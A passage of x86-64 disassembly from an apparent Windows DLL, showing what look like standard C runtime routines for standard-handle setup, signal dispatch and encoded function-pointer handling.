   18000a292:	bf 00 20 00 00       	mov    $0x2000,%edi
   18000a297:	48 03 de             	add    %rsi,%rbx
   18000a29a:	39 38                	cmp    %edi,(%rax)
   18000a29c:	0f 4c 38             	cmovl  (%rax),%edi
   18000a29f:	8b cf                	mov    %edi,%ecx
   18000a2a1:	e8 16 23 00 00       	call   0x18000c5bc
   18000a2a6:	3b 3d 84 19 01 00    	cmp    0x11984(%rip),%edi        # 0x18001bc30
   18000a2ac:	0f 4f 3d 7d 19 01 00 	cmovg  0x1197d(%rip),%edi        # 0x18001bc30
   18000a2b3:	85 ff                	test   %edi,%edi
   18000a2b5:	74 60                	je     0x18000a317
   18000a2b7:	41 8b ee             	mov    %r14d,%ebp
   18000a2ba:	48 83 3b ff          	cmpq   $0xffffffffffffffff,(%rbx)
   18000a2be:	74 47                	je     0x18000a307
   18000a2c0:	48 83 3b fe          	cmpq   $0xfffffffffffffffe,(%rbx)
   18000a2c4:	74 41                	je     0x18000a307
   18000a2c6:	f6 06 01             	testb  $0x1,(%rsi)
   18000a2c9:	74 3c                	je     0x18000a307
   18000a2cb:	f6 06 08             	testb  $0x8,(%rsi)
   18000a2ce:	75 0d                	jne    0x18000a2dd
   18000a2d0:	48 8b 0b             	mov    (%rbx),%rcx
   18000a2d3:	ff 15 ff 5e 00 00    	call   *0x5eff(%rip)        # 0x1800101d8
   18000a2d9:	85 c0                	test   %eax,%eax
   18000a2db:	74 2a                	je     0x18000a307
   18000a2dd:	48 8b c5             	mov    %rbp,%rax
   18000a2e0:	4c 8d 05 49 15 01 00 	lea    0x11549(%rip),%r8        # 0x18001b830
   18000a2e7:	48 8b cd             	mov    %rbp,%rcx
   18000a2ea:	48 c1 f9 06          	sar    $0x6,%rcx
   18000a2ee:	83 e0 3f             	and    $0x3f,%eax
   18000a2f1:	49 8b 0c c8          	mov    (%r8,%rcx,8),%rcx
   18000a2f5:	48 8d 14 c0          	lea    (%rax,%rax,8),%rdx
   18000a2f9:	48 8b 03             	mov    (%rbx),%rax
   18000a2fc:	48 89 44 d1 28       	mov    %rax,0x28(%rcx,%rdx,8)
   18000a301:	8a 06                	mov    (%rsi),%al
   18000a303:	88 44 d1 38          	mov    %al,0x38(%rcx,%rdx,8)
   18000a307:	48 ff c5             	inc    %rbp
   18000a30a:	48 ff c6             	inc    %rsi
   18000a30d:	48 83 c3 08          	add    $0x8,%rbx
   18000a311:	48 83 ef 01          	sub    $0x1,%rdi
   18000a315:	75 a3                	jne    0x18000a2ba
   18000a317:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   18000a31e:	00 
   18000a31f:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   18000a323:	49 8b 6b 18          	mov    0x18(%r11),%rbp
   18000a327:	49 8b 73 20          	mov    0x20(%r11),%rsi
   18000a32b:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   18000a32f:	49 8b e3             	mov    %r11,%rsp
   18000a332:	41 5e                	pop    %r14
   18000a334:	c3                   	ret
   18000a335:	cc                   	int3
   18000a336:	cc                   	int3
   18000a337:	cc                   	int3
   18000a338:	48 8b c4             	mov    %rsp,%rax
   18000a33b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   18000a33f:	48 89 68 10          	mov    %rbp,0x10(%rax)
   18000a343:	48 89 70 18          	mov    %rsi,0x18(%rax)
   18000a347:	48 89 78 20          	mov    %rdi,0x20(%rax)
   18000a34b:	41 56                	push   %r14
   18000a34d:	48 83 ec 20          	sub    $0x20,%rsp
   18000a351:	33 f6                	xor    %esi,%esi
   18000a353:	45 33 f6             	xor    %r14d,%r14d
   18000a356:	48 63 ce             	movslq %esi,%rcx
   18000a359:	48 8d 3d d0 14 01 00 	lea    0x114d0(%rip),%rdi        # 0x18001b830
   18000a360:	48 8b c1             	mov    %rcx,%rax
   18000a363:	83 e1 3f             	and    $0x3f,%ecx
   18000a366:	48 c1 f8 06          	sar    $0x6,%rax
   18000a36a:	48 8d 1c c9          	lea    (%rcx,%rcx,8),%rbx
   18000a36e:	48 8b 3c c7          	mov    (%rdi,%rax,8),%rdi
   18000a372:	48 8b 44 df 28       	mov    0x28(%rdi,%rbx,8),%rax
   18000a377:	48 83 c0 02          	add    $0x2,%rax
   18000a37b:	48 83 f8 01          	cmp    $0x1,%rax
   18000a37f:	76 0a                	jbe    0x18000a38b
   18000a381:	80 4c df 38 80       	orb    $0x80,0x38(%rdi,%rbx,8)
   18000a386:	e9 8f 00 00 00       	jmp    0x18000a41a
   18000a38b:	c6 44 df 38 81       	movb   $0x81,0x38(%rdi,%rbx,8)
   18000a390:	8b ce                	mov    %esi,%ecx
   18000a392:	85 f6                	test   %esi,%esi
   18000a394:	74 16                	je     0x18000a3ac
   18000a396:	83 e9 01             	sub    $0x1,%ecx
   18000a399:	74 0a                	je     0x18000a3a5
   18000a39b:	83 f9 01             	cmp    $0x1,%ecx
   18000a39e:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   18000a3a3:	eb 0c                	jmp    0x18000a3b1
   18000a3a5:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   18000a3aa:	eb 05                	jmp    0x18000a3b1
   18000a3ac:	b9 f6 ff ff ff       	mov    $0xfffffff6,%ecx
   18000a3b1:	ff 15 19 5e 00 00    	call   *0x5e19(%rip)        # 0x1800101d0
   18000a3b7:	48 8b e8             	mov    %rax,%rbp
   18000a3ba:	48 8d 48 01          	lea    0x1(%rax),%rcx
   18000a3be:	48 83 f9 01          	cmp    $0x1,%rcx
   18000a3c2:	76 0b                	jbe    0x18000a3cf
   18000a3c4:	48 8b c8             	mov    %rax,%rcx
   18000a3c7:	ff 15 0b 5e 00 00    	call   *0x5e0b(%rip)        # 0x1800101d8
   18000a3cd:	eb 02                	jmp    0x18000a3d1
   18000a3cf:	33 c0                	xor    %eax,%eax
   18000a3d1:	85 c0                	test   %eax,%eax
   18000a3d3:	74 20                	je     0x18000a3f5
   18000a3d5:	0f b6 c8             	movzbl %al,%ecx
   18000a3d8:	48 89 6c df 28       	mov    %rbp,0x28(%rdi,%rbx,8)
   18000a3dd:	83 f9 02             	cmp    $0x2,%ecx
   18000a3e0:	75 07                	jne    0x18000a3e9
   18000a3e2:	80 4c df 38 40       	orb    $0x40,0x38(%rdi,%rbx,8)
   18000a3e7:	eb 31                	jmp    0x18000a41a
   18000a3e9:	83 f9 03             	cmp    $0x3,%ecx
   18000a3ec:	75 2c                	jne    0x18000a41a
   18000a3ee:	80 4c df 38 08       	orb    $0x8,0x38(%rdi,%rbx,8)
   18000a3f3:	eb 25                	jmp    0x18000a41a
   18000a3f5:	80 4c df 38 40       	orb    $0x40,0x38(%rdi,%rbx,8)
   18000a3fa:	48 c7 44 df 28 fe ff 	movq   $0xfffffffffffffffe,0x28(%rdi,%rbx,8)
   18000a401:	ff ff 
   18000a403:	48 8b 05 66 18 01 00 	mov    0x11866(%rip),%rax        # 0x18001bc70
   18000a40a:	48 85 c0             	test   %rax,%rax
   18000a40d:	74 0b                	je     0x18000a41a
   18000a40f:	49 8b 04 06          	mov    (%r14,%rax,1),%rax
   18000a413:	c7 40 18 fe ff ff ff 	movl   $0xfffffffe,0x18(%rax)
   18000a41a:	ff c6                	inc    %esi
   18000a41c:	49 83 c6 08          	add    $0x8,%r14
   18000a420:	83 fe 03             	cmp    $0x3,%esi
   18000a423:	0f 85 2d ff ff ff    	jne    0x18000a356
   18000a429:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000a42e:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   18000a433:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   18000a438:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   18000a43d:	48 83 c4 20          	add    $0x20,%rsp
   18000a441:	41 5e                	pop    %r14
   18000a443:	c3                   	ret
   18000a444:	40 53                	rex push %rbx
   18000a446:	48 83 ec 20          	sub    $0x20,%rsp
   18000a44a:	b9 07 00 00 00       	mov    $0x7,%ecx
   18000a44f:	e8 44 dc ff ff       	call   0x180008098
   18000a454:	33 db                	xor    %ebx,%ebx
   18000a456:	33 c9                	xor    %ecx,%ecx
   18000a458:	e8 5f 21 00 00       	call   0x18000c5bc
   18000a45d:	85 c0                	test   %eax,%eax
   18000a45f:	75 0c                	jne    0x18000a46d
   18000a461:	e8 e2 fd ff ff       	call   0x18000a248
   18000a466:	e8 cd fe ff ff       	call   0x18000a338
   18000a46b:	b3 01                	mov    $0x1,%bl
   18000a46d:	b9 07 00 00 00       	mov    $0x7,%ecx
   18000a472:	e8 75 dc ff ff       	call   0x1800080ec
   18000a477:	8a c3                	mov    %bl,%al
   18000a479:	48 83 c4 20          	add    $0x20,%rsp
   18000a47d:	5b                   	pop    %rbx
   18000a47e:	c3                   	ret
   18000a47f:	cc                   	int3
   18000a480:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000a485:	57                   	push   %rdi
   18000a486:	48 83 ec 20          	sub    $0x20,%rsp
   18000a48a:	33 db                	xor    %ebx,%ebx
   18000a48c:	48 8d 3d 9d 13 01 00 	lea    0x1139d(%rip),%rdi        # 0x18001b830
   18000a493:	48 8b 0c 3b          	mov    (%rbx,%rdi,1),%rcx
   18000a497:	48 85 c9             	test   %rcx,%rcx
   18000a49a:	74 0a                	je     0x18000a4a6
   18000a49c:	e8 cb 20 00 00       	call   0x18000c56c
   18000a4a1:	48 83 24 3b 00       	andq   $0x0,(%rbx,%rdi,1)
   18000a4a6:	48 83 c3 08          	add    $0x8,%rbx
   18000a4aa:	48 81 fb 00 04 00 00 	cmp    $0x400,%rbx
   18000a4b1:	72 d9                	jb     0x18000a48c
   18000a4b3:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000a4b8:	b0 01                	mov    $0x1,%al
   18000a4ba:	48 83 c4 20          	add    $0x20,%rsp
   18000a4be:	5f                   	pop    %rdi
   18000a4bf:	c3                   	ret
   18000a4c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000a4c5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000a4ca:	57                   	push   %rdi
   18000a4cb:	48 83 ec 20          	sub    $0x20,%rsp
   18000a4cf:	48 8b f2             	mov    %rdx,%rsi
   18000a4d2:	48 8b f9             	mov    %rcx,%rdi
   18000a4d5:	48 3b ca             	cmp    %rdx,%rcx
   18000a4d8:	74 54                	je     0x18000a52e
   18000a4da:	48 8b d9             	mov    %rcx,%rbx
   18000a4dd:	48 8b 03             	mov    (%rbx),%rax
   18000a4e0:	48 85 c0             	test   %rax,%rax
   18000a4e3:	74 0a                	je     0x18000a4ef
   18000a4e5:	ff 15 7d 5d 00 00    	call   *0x5d7d(%rip)        # 0x180010268
   18000a4eb:	84 c0                	test   %al,%al
   18000a4ed:	74 09                	je     0x18000a4f8
   18000a4ef:	48 83 c3 10          	add    $0x10,%rbx
   18000a4f3:	48 3b de             	cmp    %rsi,%rbx
   18000a4f6:	75 e5                	jne    0x18000a4dd
   18000a4f8:	48 3b de             	cmp    %rsi,%rbx
   18000a4fb:	74 31                	je     0x18000a52e
   18000a4fd:	48 3b df             	cmp    %rdi,%rbx
   18000a500:	74 28                	je     0x18000a52a
   18000a502:	48 83 c3 f8          	add    $0xfffffffffffffff8,%rbx
   18000a506:	48 83 7b f8 00       	cmpq   $0x0,-0x8(%rbx)
   18000a50b:	74 10                	je     0x18000a51d
   18000a50d:	48 8b 03             	mov    (%rbx),%rax
   18000a510:	48 85 c0             	test   %rax,%rax
   18000a513:	74 08                	je     0x18000a51d
   18000a515:	33 c9                	xor    %ecx,%ecx
   18000a517:	ff 15 4b 5d 00 00    	call   *0x5d4b(%rip)        # 0x180010268
   18000a51d:	48 83 eb 10          	sub    $0x10,%rbx
   18000a521:	48 8d 43 08          	lea    0x8(%rbx),%rax
   18000a525:	48 3b c7             	cmp    %rdi,%rax
   18000a528:	75 dc                	jne    0x18000a506
   18000a52a:	32 c0                	xor    %al,%al
   18000a52c:	eb 02                	jmp    0x18000a530
   18000a52e:	b0 01                	mov    $0x1,%al
   18000a530:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000a535:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   18000a53a:	48 83 c4 20          	add    $0x20,%rsp
   18000a53e:	5f                   	pop    %rdi
   18000a53f:	c3                   	ret
   18000a540:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000a545:	57                   	push   %rdi
   18000a546:	48 83 ec 20          	sub    $0x20,%rsp
   18000a54a:	48 8b da             	mov    %rdx,%rbx
   18000a54d:	48 8b f9             	mov    %rcx,%rdi
   18000a550:	48 3b ca             	cmp    %rdx,%rcx
   18000a553:	74 1a                	je     0x18000a56f
   18000a555:	48 8b 43 f8          	mov    -0x8(%rbx),%rax
   18000a559:	48 85 c0             	test   %rax,%rax
   18000a55c:	74 08                	je     0x18000a566
   18000a55e:	33 c9                	xor    %ecx,%ecx
   18000a560:	ff 15 02 5d 00 00    	call   *0x5d02(%rip)        # 0x180010268
   18000a566:	48 83 eb 10          	sub    $0x10,%rbx
   18000a56a:	48 3b df             	cmp    %rdi,%rbx
   18000a56d:	75 e6                	jne    0x18000a555
   18000a56f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000a574:	b0 01                	mov    $0x1,%al
   18000a576:	48 83 c4 20          	add    $0x20,%rsp
   18000a57a:	5f                   	pop    %rdi
   18000a57b:	c3                   	ret
   18000a57c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000a581:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   18000a586:	57                   	push   %rdi
   18000a587:	48 83 ec 20          	sub    $0x20,%rsp
   18000a58b:	49 8b f9             	mov    %r9,%rdi
   18000a58e:	8b 0a                	mov    (%rdx),%ecx
   18000a590:	e8 03 db ff ff       	call   0x180008098
   18000a595:	90                   	nop
   18000a596:	48 8b 1d 73 fa 00 00 	mov    0xfa73(%rip),%rbx        # 0x18001a010
   18000a59d:	8b cb                	mov    %ebx,%ecx
   18000a59f:	83 e1 3f             	and    $0x3f,%ecx
   18000a5a2:	48 33 1d 9f 16 01 00 	xor    0x1169f(%rip),%rbx        # 0x18001bc48
   18000a5a9:	48 d3 cb             	ror    %cl,%rbx
   18000a5ac:	8b 0f                	mov    (%rdi),%ecx
   18000a5ae:	e8 39 db ff ff       	call   0x1800080ec
   18000a5b3:	48 8b c3             	mov    %rbx,%rax
   18000a5b6:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000a5bb:	48 83 c4 20          	add    $0x20,%rsp
   18000a5bf:	5f                   	pop    %rdi
   18000a5c0:	c3                   	ret
   18000a5c1:	cc                   	int3
   18000a5c2:	cc                   	int3
   18000a5c3:	cc                   	int3
   18000a5c4:	4c 8b dc             	mov    %rsp,%r11
   18000a5c7:	48 83 ec 28          	sub    $0x28,%rsp
   18000a5cb:	b8 03 00 00 00       	mov    $0x3,%eax
   18000a5d0:	4d 8d 4b 10          	lea    0x10(%r11),%r9
   18000a5d4:	4d 8d 43 08          	lea    0x8(%r11),%r8
   18000a5d8:	89 44 24 38          	mov    %eax,0x38(%rsp)
   18000a5dc:	49 8d 53 18          	lea    0x18(%r11),%rdx
   18000a5e0:	89 44 24 40          	mov    %eax,0x40(%rsp)
   18000a5e4:	49 8d 4b 08          	lea    0x8(%r11),%rcx
   18000a5e8:	e8 8f ff ff ff       	call   0x18000a57c
   18000a5ed:	48 83 c4 28          	add    $0x28,%rsp
   18000a5f1:	c3                   	ret
   18000a5f2:	cc                   	int3
   18000a5f3:	cc                   	int3
   18000a5f4:	48 89 0d 3d 16 01 00 	mov    %rcx,0x1163d(%rip)        # 0x18001bc38
   18000a5fb:	48 89 0d 3e 16 01 00 	mov    %rcx,0x1163e(%rip)        # 0x18001bc40
   18000a602:	48 89 0d 3f 16 01 00 	mov    %rcx,0x1163f(%rip)        # 0x18001bc48
   18000a609:	48 89 0d 40 16 01 00 	mov    %rcx,0x11640(%rip)        # 0x18001bc50
   18000a610:	c3                   	ret
   18000a611:	cc                   	int3
   18000a612:	cc                   	int3
   18000a613:	cc                   	int3
   18000a614:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   18000a619:	56                   	push   %rsi
   18000a61a:	57                   	push   %rdi
   18000a61b:	41 54                	push   %r12
   18000a61d:	41 55                	push   %r13
   18000a61f:	41 56                	push   %r14
   18000a621:	48 83 ec 40          	sub    $0x40,%rsp
   18000a625:	8b d9                	mov    %ecx,%ebx
   18000a627:	45 33 ed             	xor    %r13d,%r13d
   18000a62a:	44 21 6c 24 78       	and    %r13d,0x78(%rsp)
   18000a62f:	41 b6 01             	mov    $0x1,%r14b
   18000a632:	44 88 74 24 70       	mov    %r14b,0x70(%rsp)
   18000a637:	83 f9 02             	cmp    $0x2,%ecx
   18000a63a:	74 21                	je     0x18000a65d
   18000a63c:	83 f9 04             	cmp    $0x4,%ecx
   18000a63f:	74 4c                	je     0x18000a68d
   18000a641:	83 f9 06             	cmp    $0x6,%ecx
   18000a644:	74 17                	je     0x18000a65d
   18000a646:	83 f9 08             	cmp    $0x8,%ecx
   18000a649:	74 42                	je     0x18000a68d
   18000a64b:	83 f9 0b             	cmp    $0xb,%ecx
   18000a64e:	74 3d                	je     0x18000a68d
   18000a650:	83 f9 0f             	cmp    $0xf,%ecx
   18000a653:	74 08                	je     0x18000a65d
   18000a655:	8d 41 eb             	lea    -0x15(%rcx),%eax
   18000a658:	83 f8 01             	cmp    $0x1,%eax
   18000a65b:	77 7d                	ja     0x18000a6da
   18000a65d:	83 e9 02             	sub    $0x2,%ecx
   18000a660:	0f 84 af 00 00 00    	je     0x18000a715
   18000a666:	83 e9 04             	sub    $0x4,%ecx
   18000a669:	0f 84 8b 00 00 00    	je     0x18000a6fa
   18000a66f:	83 e9 09             	sub    $0x9,%ecx
   18000a672:	0f 84 94 00 00 00    	je     0x18000a70c
   18000a678:	83 e9 06             	sub    $0x6,%ecx
   18000a67b:	0f 84 82 00 00 00    	je     0x18000a703
   18000a681:	83 f9 01             	cmp    $0x1,%ecx
   18000a684:	74 74                	je     0x18000a6fa
   18000a686:	33 ff                	xor    %edi,%edi
   18000a688:	e9 8f 00 00 00       	jmp    0x18000a71c
   18000a68d:	e8 92 d8 ff ff       	call   0x180007f24
   18000a692:	4c 8b e8             	mov    %rax,%r13
   18000a695:	48 85 c0             	test   %rax,%rax
   18000a698:	75 18                	jne    0x18000a6b2
   18000a69a:	83 c8 ff             	or     $0xffffffff,%eax
   18000a69d:	48 8b 9c 24 88 00 00 	mov    0x88(%rsp),%rbx
   18000a6a4:	00 
   18000a6a5:	48 83 c4 40          	add    $0x40,%rsp
   18000a6a9:	41 5e                	pop    %r14
   18000a6ab:	41 5d                	pop    %r13
   18000a6ad:	41 5c                	pop    %r12
   18000a6af:	5f                   	pop    %rdi
   18000a6b0:	5e                   	pop    %rsi
   18000a6b1:	c3                   	ret
   18000a6b2:	48 8b 00             	mov    (%rax),%rax
   18000a6b5:	48 8b 0d b4 6d 00 00 	mov    0x6db4(%rip),%rcx        # 0x180011470
   18000a6bc:	48 c1 e1 04          	shl    $0x4,%rcx
   18000a6c0:	48 03 c8             	add    %rax,%rcx
   18000a6c3:	eb 09                	jmp    0x18000a6ce
   18000a6c5:	39 58 04             	cmp    %ebx,0x4(%rax)
   18000a6c8:	74 0b                	je     0x18000a6d5
   18000a6ca:	48 83 c0 10          	add    $0x10,%rax
   18000a6ce:	48 3b c1             	cmp    %rcx,%rax
   18000a6d1:	75 f2                	jne    0x18000a6c5
   18000a6d3:	33 c0                	xor    %eax,%eax
   18000a6d5:	48 85 c0             	test   %rax,%rax
   18000a6d8:	75 12                	jne    0x18000a6ec
   18000a6da:	e8 1d db ff ff       	call   0x1800081fc
   18000a6df:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   18000a6e5:	e8 52 bf ff ff       	call   0x18000663c
   18000a6ea:	eb ae                	jmp    0x18000a69a
   18000a6ec:	48 8d 78 08          	lea    0x8(%rax),%rdi
   18000a6f0:	45 32 f6             	xor    %r14b,%r14b
   18000a6f3:	44 88 74 24 70       	mov    %r14b,0x70(%rsp)
   18000a6f8:	eb 22                	jmp    0x18000a71c
   18000a6fa:	48 8d 3d 47 15 01 00 	lea    0x11547(%rip),%rdi        # 0x18001bc48
   18000a701:	eb 19                	jmp    0x18000a71c
   18000a703:	48 8d 3d 36 15 01 00 	lea    0x11536(%rip),%rdi        # 0x18001bc40
   18000a70a:	eb 10                	jmp    0x18000a71c
   18000a70c:	48 8d 3d 3d 15 01 00 	lea    0x1153d(%rip),%rdi        # 0x18001bc50
   18000a713:	eb 07                	jmp    0x18000a71c
   18000a715:	48 8d 3d 1c 15 01 00 	lea    0x1151c(%rip),%rdi        # 0x18001bc38
   18000a71c:	48 83 a4 24 80 00 00 	andq   $0x0,0x80(%rsp)
   18000a723:	00 00 
   18000a725:	45 84 f6             	test   %r14b,%r14b
   18000a728:	74 0b                	je     0x18000a735
   18000a72a:	b9 03 00 00 00       	mov    $0x3,%ecx
   18000a72f:	e8 64 d9 ff ff       	call   0x180008098
   18000a734:	90                   	nop
   18000a735:	48 8b 37             	mov    (%rdi),%rsi
   18000a738:	45 84 f6             	test   %r14b,%r14b
   18000a73b:	74 12                	je     0x18000a74f
   18000a73d:	48 8b 05 cc f8 00 00 	mov    0xf8cc(%rip),%rax        # 0x18001a010
   18000a744:	8b c8                	mov    %eax,%ecx
   18000a746:	83 e1 3f             	and    $0x3f,%ecx
   18000a749:	48 33 f0             	xor    %rax,%rsi
   18000a74c:	48 d3 ce             	ror    %cl,%rsi
   18000a74f:	48 83 fe 01          	cmp    $0x1,%rsi
   18000a753:	0f 84 94 00 00 00    	je     0x18000a7ed
   18000a759:	48 85 f6             	test   %rsi,%rsi
   18000a75c:	0f 84 03 01 00 00    	je     0x18000a865
   18000a762:	41 bc 10 09 00 00    	mov    $0x910,%r12d
   18000a768:	83 fb 0b             	cmp    $0xb,%ebx
   18000a76b:	77 3d                	ja     0x18000a7aa
   18000a76d:	41 0f a3 dc          	bt     %ebx,%r12d
   18000a771:	73 37                	jae    0x18000a7aa
   18000a773:	49 8b 45 08          	mov    0x8(%r13),%rax
   18000a777:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   18000a77e:	00 
   18000a77f:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   18000a784:	49 83 65 08 00       	andq   $0x0,0x8(%r13)
   18000a789:	83 fb 08             	cmp    $0x8,%ebx
   18000a78c:	75 53                	jne    0x18000a7e1
   18000a78e:	e8 15 d6 ff ff       	call   0x180007da8
   18000a793:	8b 40 10             	mov    0x10(%rax),%eax
   18000a796:	89 44 24 78          	mov    %eax,0x78(%rsp)
   18000a79a:	89 44 24 20          	mov    %eax,0x20(%rsp)
   18000a79e:	e8 05 d6 ff ff       	call   0x180007da8
   18000a7a3:	c7 40 10 8c 00 00 00 	movl   $0x8c,0x10(%rax)
   18000a7aa:	83 fb 08             	cmp    $0x8,%ebx
   18000a7ad:	75 32                	jne    0x18000a7e1
   18000a7af:	48 8b 05 c2 6c 00 00 	mov    0x6cc2(%rip),%rax        # 0x180011478
   18000a7b6:	48 c1 e0 04          	shl    $0x4,%rax
   18000a7ba:	49 03 45 00          	add    0x0(%r13),%rax
   18000a7be:	48 8b 0d bb 6c 00 00 	mov    0x6cbb(%rip),%rcx        # 0x180011480
   18000a7c5:	48 c1 e1 04          	shl    $0x4,%rcx
   18000a7c9:	48 03 c8             	add    %rax,%rcx
   18000a7cc:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   18000a7d1:	48 3b c1             	cmp    %rcx,%rax
   18000a7d4:	74 1d                	je     0x18000a7f3
   18000a7d6:	48 83 60 08 00       	andq   $0x0,0x8(%rax)
   18000a7db:	48 83 c0 10          	add    $0x10,%rax
   18000a7df:	eb eb                	jmp    0x18000a7cc
   18000a7e1:	48 8b 05 28 f8 00 00 	mov    0xf828(%rip),%rax        # 0x18001a010
   18000a7e8:	48 89 07             	mov    %rax,(%rdi)
   18000a7eb:	eb 06                	jmp    0x18000a7f3
   18000a7ed:	41 bc 10 09 00 00    	mov    $0x910,%r12d
   18000a7f3:	45 84 f6             	test   %r14b,%r14b
   18000a7f6:	74 0a                	je     0x18000a802
   18000a7f8:	b9 03 00 00 00       	mov    $0x3,%ecx
   18000a7fd:	e8 ea d8 ff ff       	call   0x1800080ec
   18000a802:	48 83 fe 01          	cmp    $0x1,%rsi
   18000a806:	75 07                	jne    0x18000a80f
   18000a808:	33 c0                	xor    %eax,%eax
   18000a80a:	e9 8e fe ff ff       	jmp    0x18000a69d
   18000a80f:	83 fb 08             	cmp    $0x8,%ebx
   18000a812:	75 19                	jne    0x18000a82d
   18000a814:	e8 8f d5 ff ff       	call   0x180007da8
   18000a819:	8b 50 10             	mov    0x10(%rax),%edx
   18000a81c:	8b cb                	mov    %ebx,%ecx
   18000a81e:	48 8b c6             	mov    %rsi,%rax
   18000a821:	4c 8b 05 40 5a 00 00 	mov    0x5a40(%rip),%r8        # 0x180010268
   18000a828:	41 ff d0             	call   *%r8
   18000a82b:	eb 0e                	jmp    0x18000a83b
   18000a82d:	8b cb                	mov    %ebx,%ecx
   18000a82f:	48 8b c6             	mov    %rsi,%rax
   18000a832:	48 8b 15 2f 5a 00 00 	mov    0x5a2f(%rip),%rdx        # 0x180010268
   18000a839:	ff d2                	call   *%rdx
   18000a83b:	83 fb 0b             	cmp    $0xb,%ebx
   18000a83e:	77 c8                	ja     0x18000a808
   18000a840:	41 0f a3 dc          	bt     %ebx,%r12d
   18000a844:	73 c2                	jae    0x18000a808
   18000a846:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   18000a84d:	00 
   18000a84e:	49 89 45 08          	mov    %rax,0x8(%r13)
   18000a852:	83 fb 08             	cmp    $0x8,%ebx
   18000a855:	75 b1                	jne    0x18000a808
   18000a857:	e8 4c d5 ff ff       	call   0x180007da8
   18000a85c:	8b 4c 24 78          	mov    0x78(%rsp),%ecx
   18000a860:	89 48 10             	mov    %ecx,0x10(%rax)
   18000a863:	eb a3                	jmp    0x18000a808
   18000a865:	45 84 f6             	test   %r14b,%r14b
   18000a868:	74 08                	je     0x18000a872
   18000a86a:	8d 4e 03             	lea    0x3(%rsi),%ecx
   18000a86d:	e8 7a d8 ff ff       	call   0x1800080ec
   18000a872:	b9 03 00 00 00       	mov    $0x3,%ecx
   18000a877:	e8 74 c2 ff ff       	call   0x180006af0
   18000a87c:	90                   	nop
   18000a87d:	cc                   	int3
   18000a87e:	cc                   	int3
   18000a87f:	cc                   	int3
   18000a880:	48 8b 15 89 f7 00 00 	mov    0xf789(%rip),%rdx        # 0x18001a010
   18000a887:	8b ca                	mov    %edx,%ecx
   18000a889:	48 33 15 c8 13 01 00 	xor    0x113c8(%rip),%rdx        # 0x18001bc58
   18000a890:	83 e1 3f             	and    $0x3f,%ecx
   18000a893:	48 d3 ca             	ror    %cl,%rdx
   18000a896:	48 85 d2             	test   %rdx,%rdx
   18000a899:	0f 95 c0             	setne  %al
   18000a89c:	c3                   	ret
   18000a89d:	cc                   	int3
   18000a89e:	cc                   	int3
   18000a89f:	cc                   	int3
   18000a8a0:	48 89 0d b1 13 01 00 	mov    %rcx,0x113b1(%rip)        # 0x18001bc58
   18000a8a7:	c3                   	ret
   18000a8a8:	48 8b 15 61 f7 00 00 	mov    0xf761(%rip),%rdx        # 0x18001a010
   18000a8af:	4c 8b c1             	mov    %rcx,%r8
   18000a8b2:	8b ca                	mov    %edx,%ecx
   18000a8b4:	48 33 15 9d 13 01 00 	xor    0x1139d(%rip),%rdx        # 0x18001bc58
   18000a8bb:	83 e1 3f             	and    $0x3f,%ecx
   18000a8be:	48 d3 ca             	ror    %cl,%rdx
   18000a8c1:	48 85 d2             	test   %rdx,%rdx
   18000a8c4:	75 03                	jne    0x18000a8c9
   18000a8c6:	33 c0                	xor    %eax,%eax
   18000a8c8:	c3                   	ret
   18000a8c9:	49 8b c8             	mov    %r8,%rcx
   18000a8cc:	48 8b c2             	mov    %rdx,%rax
   18000a8cf:	48 ff 25 92 59 00 00 	rex.W jmp *0x5992(%rip)        # 0x180010268
   18000a8d6:	cc                   	int3
   18000a8d7:	cc                   	int3
   18000a8d8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000a8dd:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   18000a8e2:	57                   	push   %rdi
   18000a8e3:	48 83 ec 20          	sub    $0x20,%rsp
   18000a8e7:	49 8b f9             	mov    %r9,%rdi
   18000a8ea:	49 8b d8             	mov    %r8,%rbx
   18000a8ed:	48 8b 0a             	mov    (%rdx),%rcx
   18000a8f0:	e8 0b 04 00 00       	call   0x18000ad00
   18000a8f5:	90                   	nop
   18000a8f6:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   18000a8fa:	48 8b 03             	mov    (%rbx),%rax
   18000a8fd:	48 8b 00             	mov    (%rax),%rax
   18000a900:	48 85 c0             	test   %rax,%rax
   18000a903:	74 5a                	je     0x18000a95f
   18000a905:	8b 48 14             	mov    0x14(%rax),%ecx
   18000a908:	8b c1                	mov    %ecx,%eax
   18000a90a:	c1 e8 0d             	shr    $0xd,%eax
   18000a90d:	a8 01                	test   $0x1,%al
   18000a90f:	74 4e                	je     0x18000a95f
   18000a911:	8b c1                	mov    %ecx,%eax
   18000a913:	24 03                	and    $0x3,%al
   18000a915:	3c 02                	cmp    $0x2,%al
   18000a917:	75 05                	jne    0x18000a91e
   18000a919:	f6 c1 c0             	test   $0xc0,%cl
   18000a91c:	75 0a                	jne    0x18000a928
   18000a91e:	0f ba e1 0b          	bt     $0xb,%ecx
